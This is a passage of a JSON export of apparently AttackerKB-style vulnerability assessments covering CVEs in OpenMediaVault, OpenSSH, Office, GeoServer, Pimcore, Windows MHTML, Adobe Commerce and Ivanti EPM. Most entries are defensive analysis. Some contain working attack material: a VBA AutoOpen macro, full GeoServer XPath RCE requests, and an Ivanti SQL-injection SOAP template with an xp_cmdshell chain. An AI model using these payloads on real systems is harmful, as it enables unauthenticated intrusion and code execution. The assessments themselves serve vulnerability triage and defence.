References\r\n[CVE-2013-3632](https://nvd.nist.gov/vuln/detail/CVE-2013-3632)\r\n[Packetstorm Public Exploit](https://packetstormsecurity.com/files/178526)\r\n[Metasploit Module - OpenMediaVault authenticated RCE](https://github.com/rapid7/metasploit-framework/pull/19298)\r\n[OpenMediaVault ISO Downloads](https://sourceforge.net/projects/openmediavault/files/iso/)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Persistence",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "c2e52e59-bce0-462b-b55c-f59f5b175032",
      "editorId": "4a5ca587-a819-49f8-91eb-07b9c2a708fe",
      "topicId": "032ff8d2-8bf6-4519-98c9-f568e9d99c40",
      "created": "2024-07-02T14:33:23.266696Z",
      "revisionDate": "2024-07-03T19:45:15.62156Z",
      "document": "While this vulnerability is interesting, and it certainly has the potential for immense damage and harm, the reality is far more nuanced. The difficulty in exploiting this vulnerability is significant, and will likely have to generate a lot of noise from the attacker. It takes a matter of hours (the quickest to date has been around 4 hours under lab conditions) to successfully exploit, which a lot of traffic and noise that for the most part will not go unnoticed if an organisation has the appropriate monitoring in place.\r\n\r\nIn addition, this is a not vulnerable on numerous LTS base Operating Systems such as:\r\n* RHEL (and thus CentOS) 6, 7, 8 (https://access.redhat.com/security/cve/CVE-2024-6387)\r\n* Ubuntu bionic, focal, trusty (https://access.redhat.com/security/cve/CVE-2024-6387)",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": []
    },
    {
      "id": "deffe471-0387-49c1-8bf7-eec558f98ef0",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "dd58c07c-35a0-47a1-8943-85e11d1c4ba8",
      "created": "2024-07-02T15:39:35.558802Z",
      "revisionDate": "2024-07-06T01:55:10.085291Z",
      "document": "### [CVE-2024-30104](https://attackerkb.com/contributors/nu11secur1ty)\r\n\r\nThe problem is still in the \"docx\" files this vulnerability is a 0 day based on the Follina exploit. The Microsoft company still doesn't want to understand, that they MUST remove macros options from the 365 Office and their offline app. In this video, you will see an example of this, how some users can be trickery to open the malicious file that is sent to them by the attacker. After execution of the file, the thing will be very bad for the users who execute it on their computer. It depends of the scenario.\r\n\r\n### The exploit:\r\n```vbs\r\nSub AutoOpen()\r\nDim Program As String\r\nDim TaskID As Double\r\nOn Error Resume Next\r\nProgram = \"shutdown /R\"\r\nTaskID = Shell(Program, 1)\r\nIf Err <> 0 Then\r\nMsgBox \"Can't start \" & Program\r\nEnd If\r\nEnd Sub\r\n```\r\n- Enjoy watching\r\n\r\n### Source:\r\n[link](https://github.com/nu11secur1ty/Windows11Exploits/tree/main/2024/CVE-2024-30104)\r\n\r\n### PoC:\r\n[video](https://www.patreon.com/posts/cve-2024-30104-107163015)",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "acb74366-0851-4235-bc32-0def86f0b97f",
      "editorId": "ddcf87c5-11a1-4916-bdcf-69a3ff22adde",
      "topicId": "032ff8d2-8bf6-4519-98c9-f568e9d99c40",
      "created": "2024-07-03T18:57:41.782627Z",
      "revisionDate": "2024-07-09T15:02:17.471986Z",
      "document": "Doesn't lend itself to an attackers needs. Takes a very long time to exploit, only works on a specific architecture (32bit), easily detected/blocked as malicious and requires access to a protocol (ssh) that is commonly hardened with access control lists. ",
      "score": 4,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 1
      },
      "tags": []
    },
    {
      "id": "becffd24-1aa0-4f40-8adb-2427538a6c7a",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "07d4c04a-4046-4816-95eb-f601920d4fbb",
      "created": "2024-07-10T21:41:15.229442Z",
      "revisionDate": "2024-07-25T16:28:59.105137Z",
      "document": "GeoServer is an open-source software server written in Java that provides the ability to view, edit, and share geospatial data. It is designed to be a flexible, efficient solution for distributing geospatial data from a variety of sources such as Geographic Information System (GIS) databases, web-based data, and personal datasets.\r\n\r\nIn the GeoServer version prior to `2.25.1`, `2.24.3 ` and `2.23.5` of GeoServer, multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as `XPath` expressions. It is confirmed that is exploitable through WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic and WPS Execute requests.\r\n\r\nExamples of an evil `XPath` request.\r\n\r\n**GET method request using the WFS GetPropertyValue**\r\n```html\r\nGET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'touch%20/tmp/pawned') HTTP/1.1\r\nHost: your-ip:8080\r\nAccept-Encoding: gzip, deflate, br\r\nAccept: */*\r\nAccept-Language: en-US;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\n```\r\n**POST method request using the WFS GetPropertyValue**\r\n```html\r\nPOST /geoserver/wfs HTTP/1.1\r\nHost: your-ip:8080\r\nAccept-Encoding: gzip, deflate, br\r\nAccept: */*\r\nAccept-Language: en-US;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Type: application/xml\r\nContent-Length: 356\r\n\r\n<wfs:GetPropertyValue service='WFS' version='2.0.0'\r\n xmlns:topp='http://www.openplans.org/topp'\r\n xmlns:fes='http://www.opengis.net/fes/2.0'\r\n xmlns:wfs='http://www.opengis.net/wfs/2.0'>\r\n  <wfs:Query typeNames='sf:archsites'/>\r\n  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'touch /tmp/pawned')</wfs:valueReference>\r\n</wfs:GetPropertyValue>\r\n```\r\nWhen successful, the response will return  a `java.lang.ClassCastException` error and  file `tmp/pawned` will be created.\r\n\r\nIt is important that the typeNames  or feature types like `sf:archsites` exists in the GeoServer configuration. Also some typeNames/feature types do not work. You can find a working list of default typeNames / feature types below.\r\n```\r\nallowed_feature_types = ['sf:archsites', 'sf:bugsites', 'sf:restricted', 'sf:roads', 'sf:streams', 'ne:boundary_lines', 'ne:coastlines', 'ne:countries', 'ne:disputed_areas', 'ne:populated_places']\r\n```\r\n\r\nThere are multipe method request using different `XPath expressions`. You can find a full set of examples [here](https://xz.aliyun.com/t/14991?time__1311=GqAh0IqGxmxfx0v44%2BxCqT1YGC7jqNI3x).\r\nIt is Chinese, but Google translate can help you out here ;-)\r\n\r\nI have created a [Metasploit module](https://github.com/rapid7/metasploit-framework/pull/19311) that exploits this vulnerability. It works both on Linux and Windows (credits go to jheysel-r7 to make windows work!)\r\n\r\n### Mitigation\r\nVersions `2.23.6`, `2.24.4`, and `2.25.2` contain a patch for the issue. \r\n\r\n### References\r\n[CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)\r\n[Metasploit Module - GeoServer unauthenticated RCE](https://github.com/rapid7/metasploit-framework/pull/19311)\r\n[POC examples in Chinese](https://xz.aliyun.com/t/14991?time__1311=GqAh0IqGxmxfx0v44%2BxCqT1YGC7jqNI3x)\r\n[GeoServer Advisory: GHSA-6jj6-gm7p-fcvv](https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "876bb98d-a8d3-4b1c-8e7c-f270880d3f1e",
      "editorId": "f41c3f02-06fc-4893-86de-cc578d197ab1",
      "topicId": "ccd6671e-511f-4bd8-9b64-8f118c69f582",
      "created": "2024-07-11T13:33:53.366347Z",
      "revisionDate": "2024-07-11T13:33:53.363394Z",
      "document": "This vulnerability also requires authentication, but any SharePoint user with Site Owner permissions can hit it. However, the default configuration of SharePoint allows authenticated users to create sites. That\u2019s why I disagree with Microsoft\u2019s CVSS rating here. By changing \u201cPrivileges Required\u201d to low instead of high, it takes it from a 7.2 to (IMHO) more accurate 8.8\r\n\r\nThe POC disclosed shows up the easy exploitation despite to be authenticated.\r\n ",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Lateral Movement",
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "cd11e0f9-6a68-4d14-b233-1fa6126daceb",
      "editorId": "514a77d0-dfa6-4205-95f9-1d458464a59d",
      "topicId": "bcdd3f2f-5102-4272-a9f6-8c64985fb2fa",
      "created": "2024-07-17T16:41:29.849091Z",
      "revisionDate": "2024-07-17T16:46:44.664689Z",
      "document": "### Description\r\nMissing Sanitization of `$item->getGroup()` (lines 864 and 1269) in `fieldcollectionTreeAction/objectbrickTreeAction` functions in `bundles/AdminBundle/Controller/Admin/DataObject/ClassController.php` allows Admin User to perform Source Code Injection through Stored Group Fields (in Object Bricks/Field Collection under settings module) resulting in Information Exposure (cookie theft).\r\n\r\n### Analysis\r\nWhat makes this vulnerability stored is that the Group fields (for the listings under Object Bricks or Field Collection in the Settings Module) are saved to the database in the [objectbrickUpdateAction function](https://github.com/pimcore/pimcore/blob/b5a9ad65e5a4dde1916f02019f8686ad835681ce/bundles/AdminBundle/Controller/Admin/DataObject/ClassController.php#L1091) (serves the route `/objectbrick-update` for the methods {\"PUT\", \"POST\"}).\r\n\r\nExample of the PUT request: https://demo.pimcore.com/admin/class/objectbrick-update\r\n\r\nThat means the patch only mitigates the XSS in the [objectbrickTreeAction function](https://github.com/pimcore/pimcore/blob/b5a9ad65e5a4dde1916f02019f8686ad835681ce/bundles/AdminBundle/Controller/Admin/DataObject/ClassController.php#L1225) (serves the route `/objectbrick-tree` for the methods={\"GET\", \"POST\"}).\r\n\r\nExample of the GET request: https://demo.pimcore.com/admin/class/objectbrick-tree?_dc=1721102886220&grouped=1&node=0\r\n\r\nThe execution would happen in the `Object Bricks/Field Collection` listings for `Data Objects` in the `Settings Module` (span with class `x-tree-node-text` in a table with id `treeview-record`)\r\n\r\n### Rating\r\nThe attack is relatively straightforward ([XSS payloads](https://github.com/payloadbox/xss-payload-list) are [well documented](https://wiki.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) and relatively easy to craft), requiring low privileges (anyone could access the Demo with privileged permissions and target other active users) and minimal complexity, though user interaction is needed.\r\nThe vulnerability can lead to limited data exposure and modification but does not significantly impact availability. Since the Demo resets every two hours (restoring all data to the default state), it is minimally valuable.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 1,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "ee90728c-07aa-4213-b028-b960f305ae9c",
      "editorId": "2dc5dd1e-c295-4dd9-bd7b-f3b77d6dbda5",
      "topicId": "07202732-cdaf-4eb2-ab5f-695a013b8b02",
      "created": "2024-07-19T14:51:50.296408Z",
      "revisionDate": "2024-07-23T16:16:45.652384Z",
      "document": "Trend Micro reported this vulnerability to Microsoft after observing [Void Banshee APT exploitation in the wild](https://www.trendmicro.com/en_id/research/24/g/CVE-2024-38112-void-banshee.html); the zero-day attack hinged on the premise that MHTML links would automatically open in the old Internet Explorer engine. Within the old engine context, HTA files will prompt to open by default, facilitating easier code execution. The threat actors were observed appending many spaces to the file name to misrepresent the secondary HTA file as a PDF in the IE pop-up box. Additionally, [Check Point researcher Haifei Li](https://research.checkpoint.com/2024/resurrecting-internet-explorer-threat-actors-using-zero-day-tricks-in-internet-shortcut-file-to-lure-victims-cve-2024-38112/) is credited for a report that resulted in a \"Defense-in-depth\" patch for this chain, which is probably related to the HTA file name misrepresentation trick. \r\n\r\nThe process of exploitation would typically look like this:\r\n- An attacker site is visited or a phishing message is sent to the victim.\r\n- The victim downloads a malicious \".url\" file that masquerades as a legitimate document.\r\n- The victim clicks the \".url\" payload, opening the embedded \"mhtml:\" link and launching Internet Explorer. \r\n- The IE engine prompts the user to open the second-stage HTA file.\r\n- The victim clicks \"open\" on the pseudo-PDF prompt.\r\n- The victim clicks \"Allow\" on the IE security prompt for the \"HTML Application host\" execution.\r\n\r\nIn summary, the intent of this attack chain is to misrepresent and remove some security hurdles for malware execution on Windows. Successful exploitation does still require quite a bit of clicking through prompts by the user. However, this is likely enough to significantly increase execution numbers for the affiliated malware campaign, which was reported to be deploying information stealers. ",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "d33dff0d-d59a-4d35-ae3b-542784621174",
      "editorId": "2dc5dd1e-c295-4dd9-bd7b-f3b77d6dbda5",
      "topicId": "91fe54b0-acb0-4f1c-9f79-104b0b092f3c",
      "created": "2024-07-22T14:29:46.917793Z",
      "revisionDate": "2024-07-29T08:33:19.732362Z",
      "document": "Adobe Commerce, which is based on the Magento PHP suite, is a popular framework for commerce websites. CVE-2024-34102 is a critical unauthenticated XML injection vulnerability, [initially reported by Sergey Temnikov](https://github.com/spacewasp/public_docs/blob/main/CVE-2024-34102.md), that targets Commerce.  Unsafe deserialization of data is performed with tainted JSON string data, which results in an attacker-controlled `SimpleXMLElement` class that will resolve external entities. \r\n\r\nAn attacker with unauthenticated access to Adobe Commerce can send a crafted JSON string containing an XML object that embeds DTDs to read local files, including the `env.php` that contains the JWT secret. With this information, an attacker can forge their own privileged session token and authenticate to Adobe Commerce as an administrator. Sergey also reported that the vulnerability can be chained with [the recent iconv bug in the glibc](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1#cve-2024-2961-a-bug-in-the-glibc) for RCE via PHP filters. \r\n\r\nA [Metasploit gather module for CVE-2024-34102](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/gather/magento_xxe_cve_2024_34102.rb) was contributed to the framework by @heyder. Anyone running Adobe Commerce or Magento that has not updated should do so urgently, since the vulnerability can be exploited without authentication for critical impact. Adobe has provided an [official fix for the vulnerability](https://experienceleague.adobe.com/en/docs/commerce-knowledge-base/kb/troubleshooting/known-issues-patches-attached/security-update-available-for-adobe-commerce-apsb24-40-revised-to-include-isolated-patch-for-cve-2024-34102) that can be applied over previous emergency hotfixes.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "721f9e58-f1a2-4da1-9bdc-21a2c2e0a139",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "2f3e2ab4-2856-45b0-95fa-1ebc10c89c88",
      "created": "2024-07-23T08:10:24.796682Z",
      "revisionDate": "2024-07-23T15:33:08.745827Z",
      "document": "Ivanti Endpoint Manager (EPM) versions 2022 SU5 and prior are vulnerable to SQL injection and a patch has been released, as described in the official [advisory](https://forums.ivanti.com/s/article/Security-Advisory-May-2024) and the related [KB article](https://forums.ivanti.com/s/article/KB-Security-Advisory-EPM-May-2024). It is possible to leverage this vulnerability to achieve unauthenticated remote code execution.\r\n\r\nThe function `RecordGoodApp()` in `AppMonitorAction.cs` is responsible for handling reports of \"good\" applications.\r\n\r\n```cs\r\n159     private static void RecordGoodApp(\r\n160       LanDeskDatabase database,\r\n161       string[] tokens,\r\n162       DateTime reportDate,\r\n163       int computer_idn)\r\n164     {\r\n165       try\r\n166       {\r\n167         GoodApp goodApp = new GoodApp(tokens);\r\n168         try\r\n169         {\r\n170           string sql1 = string.Format(\"Select ReportedGoodApps_Idn from ReportedGoodApps where md5 = '{0}'\", (object) goodApp.md5);\r\n171           DataRow row1 = database.ExecuteRow(sql1);\r\n```\r\n\r\nAs can be seen in line 170, `goodApp.md5` value is used to construct a SQL query without any sanitization. It happens that this value is user-supplied and this function can be reached through the `EventHandler` web service endpoint. The attack consists in sending a SOAP request to this endpoint, substituting the MD5 value with the malicious SQL command:\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap12:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap12=\"http://www.w3.org/2003/05/soap-envelope\">\r\n  <soap12:Body>\r\n    <UpdateStatusEvents xmlns=\"http://tempuri.org/\">\r\n      <deviceID>string</deviceID>\r\n      <actions>\r\n        <Action name=\"string\" code=\"0\" date=\"0\" type=\"96\" user=\"string\" configguid=\"string\" location=\"string\">\r\n          <status>GoodApp=1|md5=<SQL_COMMAND></status>\r\n        </Action>\r\n      </actions>\r\n    </UpdateStatusEvents>\r\n  </soap12:Body>\r\n</soap12:Envelope>\r\n```\r\n\r\nTo achieve remote code execution, the MS-SQL special command `xp_cmdshell` can be used this way:\r\n```SQL\r\n;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;EXEC xp_cmdshell '<MALICIOUS COMMAND>'--\r\n```\r\n\r\nA Metasploit [module](https://github.com/rapid7/metasploit-framework/pull/19274) is already available for this attack.\r\n\r\nNote that this is an unauthenticated attack and it usually results in privileged access to the vulnerable system. Since Ivanti EPM is usually running as an `NT Service` user, this can be easily escalated to a `NT AUTHORITY\\SYSTEM` privileged user.\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "54887518-c21f-46d1-93d6-ec599cc77a7c",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "2953a5f2-7411-4aa8-8d66-ffcb60767980",
      "created": "2024-07-26T13:30:35.046085Z",
      "revisionDate": "2024-07-26T13:30:35.043681Z",
      "document": "Exploited by North Korean state-sponsored attackers according to a July 2024 bulletin from multiple U.S. government agencies: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        }
      ]
    },
    {
      "id": "8909df99-507f-4f27-a36b-9c759f2b5a9f",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "131226a6-a1e9-48a1-a5d0-ac94baf8dfd2",
      "created": "2024-07-26T13:44:57.275955Z",
      "revisionDate": "2024-07-26T13:44:57.273839Z",
      "document": "Exploited by North Korean state-sponsored attackers according to a July 2024 bulletin from multiple U.S. government agencies: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        }
      ]
    },
    {
      "id": "1c84367c-9126-4988-87a0-fc9ef017d880",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "3952126d-15af-4ebb-9948-7d4c5ea8fdb1",
      "created": "2024-07-26T14:02:24.303236Z",
      "revisionDate": "2024-07-26T14:02:24.300938Z",
      "document": "Exploited by North Korean state-sponsored attackers according to a July 2024 bulletin from multiple U.S. government agencies: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        }
      ]
    },
    {
      "id": "7b9ee876-f735-4ece-a860-4f8747c641c2",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "4d398ebe-1ec3-4188-b215-37937b688a43",
      "created": "2024-07-26T14:21:24.67649Z",
      "revisionDate": "2024-07-26T14:59:16.90494Z",
      "document": "Researched or exploited by North Korean state-sponsored attackers according to a July 2024 bulletin from multiple U.S. government agencies (not on KEV, so maybe just researched?): https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        }
      ]
    },
    {
      "id": "d7a80eeb-5538-4752-8c12-aee8cbbf6bb2",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "e92f0cb9-85c2-4e4f-818b-d98851285e8b",
      "created": "2024-07-26T15:32:25.18363Z",
      "revisionDate": "2024-07-26T15:32:25.18017Z",
      "document": "A July 2024 bulletin from multiple U.S. government agencies indicates that North Korean state-sponsored attackers have demonstrated interest in this vulnerability \u2014 not immediately clear whether it was exploited or just used in reconnaissance/target selection: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a\r\n\r\n",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        }
      ]
    },
    {
      "id": "d8a5a489-a4aa-4a1a-bb22-2ef2577cc099",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "5bb7981d-92c4-4a5c-8df2-2ef959562b0f",
      "created": "2024-07-26T15:33:29.386818Z",
